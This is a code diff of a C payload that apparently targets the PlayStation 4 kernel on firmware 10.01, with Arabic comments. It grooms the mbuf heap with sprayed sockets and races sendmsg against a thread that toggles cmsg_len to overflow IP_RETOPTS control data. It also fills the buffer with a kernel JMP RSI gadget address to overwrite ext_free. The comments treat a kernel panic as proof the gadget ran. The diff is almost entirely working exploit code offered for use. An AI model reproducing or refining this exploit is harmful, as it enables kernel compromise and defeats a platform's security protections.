@@ -1,5 +1,5 @@
 #include <ps4.h>
-//#include "payload_utils.h"
+#include "payload_utils.h"
 
 struct msghdr {
     void         *msg_name;
@@ -26,18 +26,18 @@ uint8_t control_buf[CONTROL_LEN];
 int global_sock;
 int spray_socks[SPRAY_COUNT];
 
-// دالة لعمل Push (حجز mbufs في الذاكرة)
+// استخدام syscall لعملية الـ Push لضمان عدم حدوث خطأ Linker
 void push_mbufs() {
     for(int i = 0; i < SPRAY_COUNT; i++) {
         spray_socks[i] = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
         if(spray_socks[i] > 0) {
-            // نرسل بيانات صغيرة لضمان حجز mbuf
-            sendto(spray_socks[i], "A", 1, 0, NULL, 0);
+            // syscall 133 هو sendto في FreeBSD/PS4
+            // sendto(s, buf, len, flags, to, tolen)
+            syscall(133, spray_socks[i], "A", 1, 0, NULL, 0);
         }
     }
 }
 
-// دالة لعمل Pop (تحرير بعض الـ mbufs لخلق ثقوب)
 void pop_mbufs() {
     for(int i = 0; i < SPRAY_COUNT; i += 2) {
         if(spray_socks[i] > 0) {
@@ -55,8 +55,7 @@ void *sendmsg_thread(void *arg) {
     msg.msg_controllen = CONTROL_LEN;
 
     while(1) {
-        // محاولة استغلال الثغرة لكتابة الفائض
-        syscall(28, global_sock, &msg, 0);
+        syscall(28, global_sock, &msg, 0); // sendmsg
     }
     return NULL;
 }
@@ -64,8 +63,8 @@ void *sendmsg_thread(void *arg) {
 void *race_thread(void *arg) {
     (void)arg;
     while(1) {
-        cmsg->cmsg_len = 0x50;   // القيمة العادية
-        cmsg->cmsg_len = 0xFFFF; // القيمة التي تسبب الفيضان
+        cmsg->cmsg_len = 0x50;   
+        cmsg->cmsg_len = 0xFFFF; 
     }
     return NULL;
 }
@@ -76,39 +75,34 @@ int _main(struct thread *td) {
     initLibc();
     initNetwork();
 
-    // جلب عنوان النواة والقاعدة
+    // جلب القاعدة وحساب عنوان الـ Gadget
     uint64_t kbase = get_kernel_base();
-    // 10.01 JMP_RSI_GADGET = 0x68B1
-    uint64_t target_gadget = kbase + 0x68B1; 
+    uint64_t target_gadget = kbase + 0x68B1; // JMP RSI لنسخة 10.01
 
     global_sock = syscall(97, 2, 2, 0);
     
-    // إعداد البايلود لاستهداف ext_free
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0; 
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
-    // حقن عنوان الـ Gadget في أماكن استراتيجية داخل البفر لتعديل ext_free
-    for (int i = 0x50; i < CONTROL_LEN - 8; i += 8) {
+    // ملء البفر بالعنوان المستهدف لتعديل ext_free عند حدوث الفيضان
+    // نملأ مساحة واسعة لزيادة دقة الإصابة في الـ Heap
+    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
         *(uint64_t *)(control_buf + i) = target_gadget;
     }
 
-    // ترتيب الذاكرة (Grooming)
+    // تنفيذ عملية ترتيب الذاكرة
     push_mbufs();
     pop_mbufs();
 
     ScePthread thread1, thread2;
-
-    // ملاحظة: الـ SDK يستخدم مسميات مختلفة للـ Affinity
-    // سنقوم بإنشاء الخيوط بشكل مباشر
     scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
     scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
 
-    // بما أنك مجلبرك، يمكنك إرسال إشعار لرؤية الكود وهو يعمل
-    sceKernelDebugOutText(0, "Exploit Started: Racing for ext_free...\n");
-
+    // الانتظار - بما أنك مجلبرك، ستعرف أن الكود يعمل عند حدوث Kernel Panic
+    // الانهيار يعني أن النواة حاولت تنفيذ الـ Gadget الذي حقنته في ext_free
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
